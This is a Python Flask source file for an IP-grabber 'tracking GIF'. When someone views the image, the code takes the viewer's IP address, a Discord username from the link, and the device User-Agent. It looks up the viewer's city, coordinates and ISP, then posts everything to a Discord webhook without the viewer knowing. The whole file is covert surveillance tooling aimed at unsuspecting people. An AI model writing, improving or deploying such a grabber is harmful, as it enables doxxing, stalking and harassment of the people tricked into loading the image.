from flask import Flask, request, send_file
import requests
import os

app = Flask(__name__)

# Secure: Uses environment variable from Render
WEBHOOK_URL = os.getenv('WEBHOOK_URL')

# Get detailed location using ipapi.co (free, accurate)
def get_location(ip):
    try:
        url = f"https://ipapi.co/{ip}/json/"
        data = requests.get(url).json()
        city = data.get("city", "Unknown")
        region = data.get("region", "Unknown")
        country = data.get("country_name", "Unknown")
        lat = data.get("latitude")
        lon = data.get("longitude")
        accuracy = data.get("accuracy_radius", "Unknown")
        isp = data.get("org", "Unknown")
        location = f"{city}, {region}, {country}"
        coords = f"({lat}, {lon}) ±{accuracy}km" if lat and lon else "Unknown"
        return location, coords, isp
    except:
        return "Unknown", "Unknown", "Unknown"

@app.route('/track.gif')
def track():
    # Get real IP (Render passes it via X-Forwarded-For)
    forwarded = request.headers.get('X-Forwarded-For')
    ip = forwarded.split(',')[0] if forwarded else request.remote_addr
    
    # Get user from URL (e.g., ?user=cagster#1234)
    user = request.args.get('user', 'Unknown')
    
    # Get device info
    ua = request.headers.get('User-Agent', 'Unknown')
    
    # Get location
    location, coords, isp = get_location(ip)

    # Send to Discord
    payload = {
        "content": f"**GIF Clicked**\n"
                   f"**User:** `{user}`\n"
                   f"**IP:** `{ip}`\n"
                   f"**Location:** {location}\n"
                   f"**Coordinates:** `{coords}`\n"
                   f"**ISP:** `{isp}`\n"
                   f"**Device:** `{ua[:80]}`..."
    }
    if WEBHOOK_URL:
        requests.post(WEBHOOK_URL, json=payload)

    # Serve the GIF
    return send_file('custom-gif.gif', mimetype='image/gif')

if __name__ == '__main__':
    app.run()